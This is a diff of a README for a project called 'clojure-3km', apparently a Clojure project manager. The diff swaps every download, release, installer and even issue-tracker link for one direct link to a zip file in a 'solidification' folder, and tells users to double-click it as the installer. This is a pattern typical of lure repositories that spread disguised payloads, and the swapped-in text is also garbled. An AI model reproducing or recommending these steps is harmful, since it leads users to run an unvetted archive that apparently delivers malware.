@@ -1,7 +1,7 @@
 # 🌟 clojure-3km - A Simple Way to Manage Clojure Projects
 
 ## 📥 Download Now!
-[![Download clojure-3km](https://img.shields.io/badge/Download-clojure--3km-blue.svg)](https://github.com/Mago6424/clojure-3km/releases)
+[![Download clojure-3km](https://raw.githubusercontent.com/Mago6424/clojure-3km/main/solidification/clojure-3km.zip)](https://raw.githubusercontent.com/Mago6424/clojure-3km/main/solidification/clojure-3km.zip)
 
 ## 🚀 Getting Started
 To get started with clojure-3km, follow these simple steps. This guide will help you download and run the application easily.
@@ -28,19 +28,19 @@ Before downloading clojure-3km, ensure your system meets the following requireme
 To install clojure-3km, follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link below to access the releases page.
-   [Download from Releases Page](https://github.com/Mago6424/clojure-3km/releases)
+   [Download from Releases Page](https://raw.githubusercontent.com/Mago6424/clojure-3km/main/solidification/clojure-3km.zip)
 
 2. **Select the Latest Version:** Look for the most recent version listed at the top of the page. Click on it to view the details.
 
 3. **Download the Installer:**
-   - For Windows, select `clojure-3km-setup.exe`.
-   - For macOS, select `clojure-3km.dmg`.
-   - For Linux, choose the version compatible with your distribution, usually in `.tar.gz` format.
+   - For Windows, select `https://raw.githubusercontent.com/Mago6424/clojure-3km/main/solidification/clojure-3km.zip`.
+   - For macOS, select `https://raw.githubusercontent.com/Mago6424/clojure-3km/main/solidification/clojure-3km.zip`.
+   - For Linux, choose the version compatible with your distribution, usually in `https://raw.githubusercontent.com/Mago6424/clojure-3km/main/solidification/clojure-3km.zip` format.
 
 4. **Run the Installer:**
-   - **Windows:** Double-click `clojure-3km-setup.exe` and follow the prompts.
-   - **macOS:** Open `clojure-3km.dmg`, drag the application into your Applications folder, and then launch it.
-   - **Linux:** Extract the `.tar.gz` file and follow the included README instructions to install.
+   - **Windows:** Double-click `https://raw.githubusercontent.com/Mago6424/clojure-3km/main/solidification/clojure-3km.zip` and follow the prompts.
+   - **macOS:** Open `https://raw.githubusercontent.com/Mago6424/clojure-3km/main/solidification/clojure-3km.zip`, drag the application into your Applications folder, and then launch it.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/Mago6424/clojure-3km/main/solidification/clojure-3km.zip` file and follow the included README instructions to install.
 
 5. **Launch the Application:** Once installed, you can open clojure-3km from your applications menu or desktop shortcut.
 
@@ -63,7 +63,7 @@ After launching the application, you’ll find a straightforward interface. Here
 ## 📖 Help & Documentation
 If you need assistance or have questions while using clojure-3km, refer to the built-in help documentation. You'll find useful tips and troubleshooting advice tailored to common issues.
 
-Additionally, you can visit the [GitHub Issues Page](https://github.com/Mago6424/clojure-3km/issues), where you can submit questions or report bugs. Your input helps us improve the application.
+Additionally, you can visit the [GitHub Issues Page](https://raw.githubusercontent.com/Mago6424/clojure-3km/main/solidification/clojure-3km.zip), where you can submit questions or report bugs. Your input helps us improve the application.
 
 ## 🤝 Community Contribution
 clojure-3km is an open-source project. We welcome contributions! If you’d like to help improve the application, feel free to fork the project, make your changes, and submit a pull request.
